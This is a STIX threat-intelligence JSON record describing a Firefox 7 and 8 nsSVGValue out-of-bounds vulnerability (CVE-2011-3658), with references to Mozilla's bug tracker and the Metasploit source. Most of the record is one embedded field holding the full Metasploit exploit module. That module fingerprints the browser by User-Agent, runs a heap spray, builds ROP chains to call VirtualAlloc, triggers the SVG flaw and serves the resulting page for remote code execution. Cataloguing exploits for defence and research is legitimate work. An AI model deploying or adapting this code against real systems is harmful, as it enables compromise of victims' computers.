{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fa46e176-8844-4083-9531-af6806b3478b",
    "created": "2024-08-14T16:41:55.250385Z",
    "modified": "2024-08-14T16:41:55.250389Z",
    "name": "Firefox nsSVGValue Out-of-Bounds Access Vulnerability",
    "description": " This module exploits an out-of-bounds access flaw in Firefox 7 and 8 (<= 8.0.1). The notification of nsSVGValue observers via nsSVGValue::NotifyObservers(x,y) uses a loop which can result in an out-of-bounds access to attacker-controlled memory. The mObserver ElementAt() function (which picks up pointers), does not validate if a given index is out of bound. If a custom observer of nsSVGValue is created which removes elements from the original observer and memory layout is manipulated properly, the ElementAt() function might pick up an attacker provided pointer, which can be leveraged to gain remote arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/mozilla_nssvgvalue.rb",
            "external_id": "mozilla_nssvgvalue.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3658"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=708186"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Firefox nsSVGValue Out-of-Bounds Access Vulnerability',\n      'Description'    => %q{\n        This module exploits an out-of-bounds access flaw in Firefox 7 and 8 (<= 8.0.1).\n        The notification of nsSVGValue observers via nsSVGValue::NotifyObservers(x,y)\n        uses a loop which can result in an out-of-bounds access to attacker-controlled memory.\n        The mObserver ElementAt() function (which picks up pointers), does not validate\n        if a given index is out of bound. If a custom observer of nsSVGValue is created,\n        which removes elements from the original observer,\n        and memory layout is manipulated properly, the ElementAt() function might pick up\n        an attacker provided pointer, which can be leveraged to gain remote arbitrary\n        code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'regenrecht',                          #vulnerability discovery\n          'Lincoln<lincoln[at]corelan.be>',      #Metasploit module\n          'corelanc0d3r<peter.ve[at]corelan.be>' #Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-3658' ],\n          [ 'OSVDB', '77953'],\n          [ 'ZDI', '12-056' ],\n          [ 'URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=708186' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'BadChars'       => \"\\x00\\x0a\\x0d\\x34\",\n          'DisableNops'    => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x24\\xfa\\xff\\xff\"  #ADD ESP, -5DC\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'Windows XP - Firefox 7',\n            {\n              'Ret'    => 0x0C0C0C0C,\n              'OffSet' => 0x606,\n              'Size'   => 0x40000,\n              'PopEax' => 0x7819e4b4, # POP EAX # RETN [MOZCRT19.dll]\n              'FF'     => 7,\n              'OS'     => 'XP'\n            }\n          ],\n          [\n            'Windows XP - Firefox 8 (<= 8.0.1)',\n            {\n              'Ret'    => 0x0C0C0C0C,\n              'OffSet' => 0x606,\n              'Size'   => 0x40000,\n              'PopEax' => 0x7819e504, # POP EAX # RETN [MOZCRT19.dll]\n              'FF'     => 8,\n              'OS'     => 'XP'\n            }\n          ]\n        ],\n      'DisclosureDate' => '2011-12-06',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def junk(n=4)\n    return rand_text_alpha_upper(n).unpack(\"L\")[0].to_i\n  end\n\n  def nop\n    return make_nops(4).unpack(\"L\")[0].to_i\n  end\n\n  def get_rop_chain(ffversion,osversion)\n\n    # mona.py ROP chains\n\n    rop_chain = []\n\n    if ffversion == 7 and osversion == \"XP\"\n\n      rop_chain =\n      [\n        0x781a909c,     # ptr to &VirtualAlloc() [IAT MOZCRT19.dll]\n        0x7813aeed,     # MOV EAX,DWORD PTR DS:[EAX] # RETN [MOZCRT19.dll]\n        0x78194774,     # PUSH EAX # POP ESI # POP EDI # POP EBP # POP EBX # RETN [MOZCRT19.dll]\n        0x78139801,     # RETN (ROP NOP) [MOZCRT19.dll] -> edi\n        0x78195375,     # & push esp #  ret  [MOZCRT19.dll] -> ebp\n        0x00000001,     # 0x00000001-> ebx\n        0x7819966e,     # POP EDX # RETN [MOZCRT19.dll]\n        0x00001000,     # 0x00001000-> edx\n        0x7813557f,     # POP ECX # RETN [MOZCRT19.dll]\n        0x00000040,     # 0x00000040-> ecx\n        0x781a4da8,     # POP EAX # RETN [MOZCRT19.dll]\n        nop,            # nop\n        0x7813d647,     # PUSHAD # RETN [MOZCRT19.dll]\n      ].flatten.pack(\"V*\")\n\n    elsif ffversion == 8 and osversion == \"XP\"\n\n      rop_chain =\n      [\n        0x781a909c,     # ptr to &VirtualAlloc() [IAT MOZCRT19.dll]\n        0x7813af5d,     # MOV EAX,DWORD PTR DS:[EAX] # RETN [MOZCRT19.dll]\n        0x78197f06,     # XCHG EAX,ESI # RETN [MOZCRT19.dll]\n        0x7814eef1,     # POP EBP # RETN [MOZCRT19.dll]\n        0x781503c3,     # & call esp [MOZCRT19.dll]\n        0x781391d0,     # POP EBX # RETN [MOZCRT19.dll]\n        0x00000001,     # 0x00000001-> ebx\n        0x781a147c,     # POP EDX # RETN [MOZCRT19.dll]\n        0x00001000,     # 0x00001000-> edx\n        0x7819728e,     # POP ECX # RETN [MOZCRT19.dll]\n        0x00000040,     # 0x00000040-> ecx\n        0x781945b5,     # POP EDI # RETN [MOZCRT19.dll]\n        0x78152809,     # RETN (ROP NOP) [MOZCRT19.dll]\n        0x7819ce58,     # POP EAX # RETN [MOZCRT19.dll]\n        nop,            # nop\n        0x7813d6b7,     # PUSHAD # RETN [MOZCRT19.dll]\n      ].flatten.pack(\"V*\")\n\n    end\n\n    return rop_chain\n  end\n\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # determine the target FF and OS version\n\n    ffversion = \"\"\n    osversion = \"\"\n\n    agent = request.headers['User-Agent']\n\n    if agent !~ /Firefox\\/7\\.0/ and agent !~ /Firefox\\/8\\.0/ and agent !~ /Firefox\\/8\\.0\\.1/\n      vprint_error(\"This browser version is not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    my_target = target\n    if my_target.name == 'Automatic'\n      if agent =~ /NT 5\\.1/ and agent =~ /Firefox\\/7/\n        my_target = targets[1]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /Firefox\\/8/\n        my_target = targets[2]\n      elsif vprint_error(\"This Operating System is not supported: #{agent.to_s}\")\n        send_not_found(cli)\n        return\n      end\n      target = my_target\n    end\n\n    # Create the payload\n    print_status(\"Creating payload for #{my_target.name}\")\n    table =\n    [\n      0x0c0c0c0c,  # index\n      0x0c0c0c0c,  # index\n      0x0c0c0c0c,  # index\n      0x7c45abdf   # Stack->Heap Flip XCHG EAX,ESP # ADD [EAX],EAX # ADD ESP,48h # RETN 28 [MOZCPP19.DLL]\n    ].pack(\"V*\")\n\n    rop = rand_text_alpha_upper(56)\n    rop << [ my_target['PopEax'] ].pack(\"V\")\n    rop << rand_text_alpha_upper(40)\n    rop << get_rop_chain(my_target['FF'],my_target['OS'])\n\n    # Encode table, chain and payload\n    rop_js = Rex::Text.to_unescape(table+rop, Rex::Arch.endian(my_target.arch))\n\n    code = payload.encoded\n    code_js = Rex::Text.to_unescape(code, Rex::Arch.endian(my_target.arch))\n\n    # random JavaScript variable names\n    i_name                  = rand_text_alpha(rand(10) + 5)\n    rop_name                = rand_text_alpha(rand(10) + 5)\n    code_name               = rand_text_alpha(rand(10) + 5)\n    offset_length_name      = rand_text_alpha(rand(10) + 5)\n    randnum1_name           = rand_text_alpha(rand(10) + 5)\n    randnum2_name           = rand_text_alpha(rand(10) + 5)\n    randnum3_name           = rand_text_alpha(rand(10) + 5)\n    randnum4_name           = rand_text_alpha(rand(10) + 5)\n    paddingstr_name         = rand_text_alpha(rand(10) + 5)\n    padding_name            = rand_text_alpha(rand(10) + 5)\n    junk_offset_name        = rand_text_alpha(rand(10) + 5)\n    single_sprayblock_name  = rand_text_alpha(rand(10) + 5)\n    sprayblock_name         = rand_text_alpha(rand(10) + 5)\n    varname_name            = rand_text_alpha(rand(10) + 5)\n    thisvarname_name        = rand_text_alpha(rand(10) + 5)\n    container_name          = rand_text_alpha(rand(10) + 5)\n    tls_name                = rand_text_alpha(rand(10) + 5)\n    tl_name                 = rand_text_alpha(rand(10) + 5)\n    rect_name               = rand_text_alpha(rand(10) + 5)\n    big_name                = rand_text_alpha(rand(10) + 5)\n    small_name              = rand_text_alpha(rand(10) + 5)\n    listener_name           = rand_text_alpha(rand(10) + 5)\n    run_name                = rand_text_alpha(rand(10) + 5)\n    svg_name                = rand_text_alpha(rand(10) + 5)\n    atl_name                = rand_text_alpha(rand(10) + 5)\n    addr_name               = rand_text_alpha(rand(10) + 5)\n    trans_name              = rand_text_alpha(rand(10) + 5)\n    matrix_name             = rand_text_alpha(rand(10) + 5)\n\n    # corelan precise heap spray for Firefox >= 7\n    # + trigger routine\n    spray = <<-JS\n\n    var #{rop_name} = unescape(\"#{rop_js}\");\n    var #{code_name} = unescape(\"#{code_js}\");\n    var #{offset_length_name} = #{my_target['OffSet']};\n\n    for (var #{i_name}=0; #{i_name} < 0x300; #{i_name}++)\n    {\n      var #{randnum1_name}=Math.floor(Math.random()*90)+10;\n      var #{randnum2_name}=Math.floor(Math.random()*90)+10;\n      var #{randnum3_name}=Math.floor(Math.random()*90)+10;\n      var #{randnum4_name}=Math.floor(Math.random()*90)+10;\n\n      var #{paddingstr_name} = \"%u\" + #{randnum1_name}.toString() + #{randnum2_name}.toString();\n      #{paddingstr_name} += \"%u\" + #{randnum3_name}.toString() + #{randnum4_name}.toString();\n\n      var #{padding_name} = unescape(#{paddingstr_name});\n\n      while (#{padding_name}.length < 0x1000) #{padding_name}+= #{padding_name};\n\n      #{junk_offset_name} = #{padding_name}.substring(0, #{offset_length_name});\n\n      var #{single_sprayblock_name} = #{junk_offset_name} + #{rop_name} + #{code_name};\n      #{single_sprayblock_name} += #{padding_name}.substring(0,0x800 - #{offset_length_name} - #{rop_name}.length - #{code_name}.length);\n\n      while (#{single_sprayblock_name}.length < #{my_target['Size']}) #{single_sprayblock_name} += #{single_sprayblock_name};\n\n      #{sprayblock_name} = #{single_sprayblock_name}.substring(0, (#{my_target['Size']}-6)/2);\n\n      #{varname_name} = \"var\" + #{randnum1_name}.toString() + #{randnum2_name}.toString();\n      #{varname_name} += #{randnum3_name}.toString() + #{randnum4_name}.toString() + #{i_name}.toString();\n      #{thisvarname_name} = \"var \" + #{varname_name} + \"= '\" + #{sprayblock_name} +\"';\";\n      eval(#{thisvarname_name});\n    }\n\n    var #{container_name} = [];\n\n    var #{tls_name} = [];\n    var #{rect_name} = null;\n    var #{big_name} = null;\n    var #{small_name} = null;\n\n    function #{listener_name}() {\n      #{rect_name}.removeEventListener(\"DOMAttrModified\", #{listener_name}, false);\n      for each (#{tl_name} in #{tls_name})\n      #{tl_name}.clear();\n\n      for (#{i_name} = 0; #{i_name} < (1<<7); ++#{i_name})\n        #{container_name}.push(unescape(#{big_name}));\n      for (#{i_name} = 0; #{i_name} < (1<<22); ++#{i_name})\n        #{container_name}.push(unescape(#{small_name}));\n    }\n\n    function #{run_name}() {\n      var #{svg_name} = document.getElementById(\"#{svg_name}\");\n      #{rect_name} = document.getElementById(\"#{rect_name}\");\n\n      for (#{i_name} = 0; #{i_name} < (1<<13); ++#{i_name}) {\n        #{rect_name} = #{rect_name}.cloneNode(false);\n        var #{atl_name} = #{rect_name}.transform;\n        var #{tl_name} = #{atl_name}.baseVal;\n        #{tls_name}.push(#{tl_name});\n      }\n\n      const #{addr_name} = unescape(\"%u0c0c\");\n      #{big_name} = #{addr_name};\n      while (#{big_name}.length != 0x1000)\n      #{big_name} += #{big_name};\n\n      #{small_name} = #{addr_name};\n      while (#{small_name}.length != 15)\n      #{small_name} += #{addr_name};\n\n      var #{trans_name} = #{svg_name}.createSVGTransform();\n      for each (#{tl_name} in #{tls_name})\n        #{tl_name}.appendItem(#{trans_name});\n\n      #{rect_name}.addEventListener(\"DOMAttrModified\", #{listener_name}, false);\n      var #{matrix_name} = #{svg_name}.createSVGMatrix();\n      #{trans_name}.setMatrix(#{matrix_name});\n    }\n    JS\n\n    # build html\n    content = <<-HTML\n    <html>\n    <head>\n    <meta http-equiv=\"refresh\" content=\"3\">\n    <body>\n    <script language='javascript'>\n    #{spray}\n    </script>\n    </head>\n    <body onload=\"#{run_name}();\">\n    <svg id=\"#{svg_name}\">\n    <rect id=\"#{rect_name}\"\t/>\n    </svg>\n    </body>\n    </html>\n    HTML\n\n    print_status(\"Sending HTML\")\n\n    # Transmit the response to the client\n    send_response(cli, content, {'Content-Type'=>'text/html'})\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-06",
    "x_mitre_platforms": [
        "win'"
    ]
}